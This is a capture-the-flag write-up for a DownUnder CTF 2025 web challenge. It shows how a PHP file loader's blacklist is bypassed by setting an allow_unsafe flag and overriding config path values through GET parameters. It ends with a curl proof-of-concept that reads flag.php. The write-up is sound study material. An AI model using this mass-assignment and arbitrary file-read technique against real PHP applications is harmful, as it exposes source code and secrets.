---
{"dg-publish":true,"permalink":"/personal-site/completed-writeups/down-under/philtered/","tags":["web","downunder_ctf_25"]}
---

This is a php app that populates content dynamically, but has a filter on what gets loaded. the first thing I noticed is that it has an `allow_unsafe` flag when checking:

Class File loader:
```php
 public $config;
    // idk if we would need to load files from other directories or nested directories, but better to keep it flexible if I change my mind later
    public $allow_unsafe = false;
    // These terms will be philtered out to prevent unsafe file access
    public $blacklist = ['php', 'filter', 'flag', '..', 'etc', '/', '\\'];
    
    public function __construct() {
        $this->config = new Config();
    }
    
    public function contains_blacklisted_term($value) {
        if (!$this->allow_unsafe) {
            foreach ($this->blacklist as $term) {
                if (stripos($value, $term) !== false) {
                    return true;    
                }
            }
        }
        return false;
    }
```
- I can pass `allow_unsafe=true` as a GET param to bypass it entirely.

This line is where the vulnerability lies:
```php
$loader->assign_props($_GET);
```

```php
 public function assign_props($input) {
        foreach ($input as $key => $value) {
            if (is_array($value) && isset($this->$key)) {
                foreach ($value as $subKey => $subValue) {
                    if (property_exists($this->$key, $subKey)) {
                        if ($this->contains_blacklisted_term($subValue)) {
                            $subValue = 'philtered.txt'; // Default to a safe file if blacklisted term is found
                        }
                        $this->$key->$subKey = $subValue;
                    }
                }
            } else if (property_exists($this, $key)) {
                if ($this->contains_blacklisted_term($value)) {
                    $value = 'philtered.txt'; // Default to a safe file if blacklisted term is found
                }
                $this->$key = $value;
            }
        }
    }
```

It reads everything from the Global GET array, including array params (it specifically checks for them and handles them accordingly). This is key for modifying the Config, as I can bypass the filter as shown earlier. I can set filtered properties to the loader's config directly:

```php
class Config {
    public $path = 'information.txt';
    public $data_folder = 'data/';
}
```
- By default it would be `information.txt` and `philtered.txt` if we don't bypass the filter.

Config has a `path` and a `data_folder`, and `FileLoader` has a config.
Constructing a new file loader also constructs a new config associated with it. this is done in the `index.php`. it also loads content from the data folder into its main body using the `load()` method for FileLoaders:

```php
public function load() {
        return file_get_contents($this->config->data_folder . $this->config->path);
    }
```
- It concatenates `path` to `data_folder` for a complete relative filepath

I need to pass the `allow_unsafe=true` param as well as `config[path]=flag.php` and `config[data_folder]=./` to get the loader to load the contents of `flag.php` which looks like this: `<?php $flag = 'DUCTF{TEST_FLAG}'; ?>`

> [!bug]+ poc
> 
> ```sh
> curl http://$URL/index.php?allow_unsafe=true&config[path]=flag.php&config[data_folder]=./
> ```

Successfully changing the loaded content should show errors like this:

![Pasted image 20250817103052.png](/img/user/img/Pasted%20image%2020250817103052.png)

with the `flag.php` contents loaded into the index:

![Pasted image 20250817103126.png](/img/user/img/Pasted%20image%2020250817103126.png)